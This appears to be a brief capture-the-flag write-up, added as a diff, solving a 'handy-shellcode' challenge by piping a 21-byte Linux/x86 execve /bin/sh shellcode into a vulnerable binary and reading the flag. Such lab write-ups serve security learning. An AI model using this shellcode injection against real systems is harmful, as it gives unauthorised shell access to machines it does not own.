@@ -1,0 +1,8 @@
+1. open cognitivectf shell
+2. move to cd /problems/handy-shellcode_3_eefb645e8107c9aa00c62fb91b755de8
+3. open this http://shell-storm.org/shellcode/index.html
+   and find Linux/x86 - Tiny Execve sh Shellcode - 21 bytes by Geyslan G. Bem
+4. run this code on shell
+(echo -e "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";cat) | ./vuln
+5. cat flag.txt
+6 :^)
